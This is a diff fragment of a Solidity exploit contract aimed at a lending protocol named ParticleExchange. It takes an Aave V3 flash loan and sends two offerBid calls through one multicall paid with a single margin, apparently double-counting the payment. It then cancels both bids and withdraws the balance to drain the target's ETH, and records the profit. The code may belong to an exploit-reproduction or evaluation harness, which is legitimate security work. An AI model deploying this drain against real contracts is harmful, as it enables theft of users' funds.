+        // Path 1 (swapWithEth on two existing liens) is not self-discoverable onchain here because
+        // ParticleExchange stores only `keccak256(abi.encode(lien))` in `liens[lienId]`. Without
+        // pre-known historical lien tuples reconstructed from prior logs, a contract cannot build the
+        // exact `Lien` calldata required by `validateLien(...)`. This verifier therefore executes the
+        // mechanically aligned bid-margin route and leaves the swap route blocked on external lien data.
+        if (address(TARGET).balance == 0) {
+            _profitAmount = 0;
+            return;
+        }
+
+        if (address(this).balance >= DIRECT_MARGIN) {
+            _runBidPath(DIRECT_MARGIN);
+            _profitAmount = address(this).balance;
+            return;
+        }
+
+        IAaveV3PoolLike(AAVE_V3_POOL).flashLoanSimple(address(this), WETH, DIRECT_MARGIN, bytes(""), 0);
+        _profitAmount = address(this).balance;
+    }
+
+    function executeOperation(
+        address asset,
+        uint256 amount,
+        uint256 premium,
+        address initiator,
+        bytes calldata
+    ) external override returns (bool) {
+        require(msg.sender == AAVE_V3_POOL, "pool");
+        require(initiator == address(this), "initiator");
+        require(asset == WETH, "asset");
+
+        IWETHLike(WETH).withdraw(amount);
+        _runBidPath(amount);
+
+        if (premium != 0) {
+            require(address(this).balance > premium, "no-profit");
+        }
+
+        IWETHLike(WETH).deposit{value: amount + premium}();
+        IWETHLike(WETH).approve(AAVE_V3_POOL, amount + premium);
+        return true;
+    }
+
+    function profitToken() external pure returns (address) {
+        return address(0);
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _runBidPath(uint256 margin) internal {
+        require(margin != 0, "margin");
+        require(address(TARGET).balance >= margin, "no-target-eth");
+
+        bytes[] memory createCalls = new bytes[](2);
+        createCalls[0] = abi.encodeWithSignature("offerBid(address,uint256,uint256,uint256)", address(0), margin, 0, 0);
+        createCalls[1] = abi.encodeWithSignature("offerBid(address,uint256,uint256,uint256)", address(0), margin, 0, 0);
+
+        bytes[] memory createResults = IParticleExchangeLike(TARGET).multicall{value: margin}(createCalls);
+        uint256 lienIdA = abi.decode(createResults[0], (uint256));
+        uint256 lienIdB = abi.decode(createResults[1], (uint256));
+
+        Lien memory syntheticBid = Lien({
+            lender: address(0),
+            borrower: address(this),
+            collection: address(0),
+            tokenId: margin,
+            price: 0,
+            rate: 0,
+            loanStartTime: 0,
+            auctionStartTime: 0
+        });
+
+        bytes[] memory settleCalls = new bytes[](3);
+        settleCalls[0] = abi.encodeCall(IParticleExchangeLike.cancelBid, (syntheticBid, lienIdA));
+        settleCalls[1] = abi.encodeCall(IParticleExchangeLike.cancelBid, (syntheticBid, lienIdB));
+        settleCalls[2] = abi.encodeCall(IParticleExchangeLike.withdrawAccountBalance, ());
+
+        IParticleExchangeLike(TARGET).multicall(settleCalls);
+    }
+}

